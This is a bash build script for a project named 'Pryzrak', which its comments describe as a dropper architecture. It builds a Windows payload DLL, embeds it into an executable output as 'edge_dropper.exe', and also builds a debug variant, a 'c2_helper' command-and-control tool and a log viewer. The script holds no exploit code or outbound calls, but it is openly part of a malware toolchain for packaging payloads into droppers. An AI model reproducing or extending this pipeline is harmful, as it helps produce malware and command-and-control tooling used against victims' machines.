#!/bin/bash
# Pryzrak Build Script
# Two-phase build for dropper architecture

set -e

TARGET="x86_64-pc-windows-gnu"
DIST_DIR="dist"

echo "=== PHASE 1: Building edge.dll (payload) ==="
# First, remove payload.dll to build clean DLL
rm -f crates/nodes/edge/src/assets/payload.dll

# Create empty placeholder (required for include_bytes! to compile)
echo -n "" > crates/nodes/edge/src/assets/payload.dll

# Build lib only (DLL)
cargo build -p edge --lib --release --target $TARGET

# Copy built DLL
cp target/$TARGET/release/edge.dll $DIST_DIR/

echo "DLL Size: $(ls -lh $DIST_DIR/edge.dll | awk '{print $5}')"

echo ""
echo "=== PHASE 2: Embedding DLL and building edge.exe (dropper) ==="
# Copy DLL as payload for embedding
cp target/$TARGET/release/edge.dll crates/nodes/edge/src/assets/payload.dll

# Build bin (EXE) with embedded DLL
cargo build -p edge --bin edge --release --target $TARGET

# Copy as dropper
cp target/$TARGET/release/edge.exe $DIST_DIR/edge_dropper.exe

echo "Dropper Size: $(ls -lh $DIST_DIR/edge_dropper.exe | awk '{print $5}')"

echo ""
echo "=== PHASE 3: Building debug version ==="
cargo build -p edge --bin edge --release --target $TARGET --features debug_mode
cp target/$TARGET/release/edge.exe $DIST_DIR/edge_debug.exe

echo ""
echo "=== PHASE 4: Building tools ==="
cargo build -p c2_helper --release
cargo build -p log_viewer --release --target $TARGET

cp target/release/c2_helper $DIST_DIR/
cp target/$TARGET/release/log_viewer.exe $DIST_DIR/

echo ""
echo "=== BUILD COMPLETE ==="
ls -lh $DIST_DIR/edge*.exe $DIST_DIR/edge.dll $DIST_DIR/c2_helper $DIST_DIR/log_viewer.exe
